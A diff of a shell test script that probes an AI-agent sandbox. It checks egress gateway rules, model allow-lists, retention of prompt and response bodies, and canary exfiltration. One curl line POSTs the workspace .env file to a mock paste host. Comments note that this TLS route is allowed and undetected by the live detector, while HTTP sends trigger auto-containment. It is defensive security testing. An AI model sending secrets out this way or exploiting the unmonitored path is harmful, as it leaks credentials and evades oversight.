@@ -7,7 +7,9 @@ set -uo pipefail
 cd "$(dirname "$0")/.."
 pass=0; fail=0
 check() { if [ "$2" = "$3" ]; then echo "PASS  $1 (got $3)"; pass=$((pass+1)); else echo "FAIL  $1 (expected $2, got $3)"; fail=$((fail+1)); fi; }
-SID=$(bin/sbxctl run bugfix-agent -p repo=demo/app -p task="Reply with the word ok. Do not use any tools." | sed -n 's/^session \([a-z0-9]*\) started.*/\1/p')
+# bugfix-agent-open write-allows paste-mock (deliberately vulnerable), so the HTTP/TLS exfil mechanics
+# below are reachable; the default bugfix-agent spec blocks them (security_test B9/B10).
+SID=$(bin/sbxctl run bugfix-agent-open -p repo=demo/app -p task="Reply with the word ok. Do not use any tools." | sed -n 's/^session \([a-z0-9]*\) started.*/\1/p')
 POD="sandbox-$SID"
 cleanup() { SBX_USER=secops bin/sbxctl destroy "$SID" >/dev/null 2>&1 || bin/sbxctl destroy "$SID" >/dev/null 2>&1; }
 trap cleanup EXIT
@@ -18,7 +20,7 @@ sb() { kubectl -n sbx-sessions exec "$POD" -- "$@" 2>/dev/null; }
 code() { sb curl -s -o /dev/null -m 10 -w '%{http_code}' "$@" || true; }
 for _ in $(seq 1 20); do [ "$(code http://paste-mock.lab-ext/ping)" = 200 ] && break; sleep 1; done
 
-# Order matters now that the M4 detector is live: an HTTP canary send triggers D1 auto-containment,
+# Order matters now that detection is live (sentinel): an HTTP canary send triggers D1 auto-containment,
 # so functional checks run first, the (undetectable) TLS canary next, and the HTTP canary last.
 echo "--- egress gateway"
 check "allowed host, benign POST"         200 "$(code -X POST --data 'hello' http://paste-mock.lab-ext/upload)"
@@ -32,6 +34,14 @@ check "disallowed model (B8)" 403 "$(code -X POST http://gateway:8080/v1/message
   -d '{"model":"claude-opus-5-5","max_tokens":16,"messages":[{"role":"user","content":"hi"}]}')"
 out=$(kubectl -n sbx-sessions exec "$POD" -- sh -c 'cd /workspace && timeout 180 claude -p "Use the Bash tool to run exactly: echo sbx-tool-ok. Then reply with only the command output." --model claude-sonnet-5-5 --allowedTools "Bash(echo:*)" 2>&1' || true)
 check "claude -p via gateway (real key injected upstream)" 1 "$(echo "$out" | grep -c 'sbx-tool-ok' | awk '{print ($1>0)?1:0}')"
+
+echo "--- reasoning-chain retention (prompt/response bodies, outside the sandbox)"
+BODIES=$(kubectl -n sbx-system exec deploy/gateway -- python -c "
+import glob,gzip,json; fs=sorted(glob.glob('/evidence/bodies/$SID/*.gz')); txt=''.join(gzip.open(f,'rt').read() for f in fs)
+print(len(fs), int('$CANARY' in txt), int('sbx-tool-ok' in txt))")
+check "prompt/response bodies stored for the session" yes "$( [ "$(echo $BODIES | cut -d' ' -f1)" -gt 0 ] && echo yes || echo no)"
+check "bodies contain the tool call (reasoning chain)" 1 "$(echo $BODIES | cut -d' ' -f3)"
+check "canary redacted in stored bodies" 0 "$(echo $BODIES | cut -d' ' -f2)"
 
 echo "--- canary exfil"
 check "allowed host over TLS, canary (B10: allowed, undetected)" 200 "$(code -k -X POST --data-binary @/workspace/repo/.env https://paste-mock.lab-ext.svc/upload)"
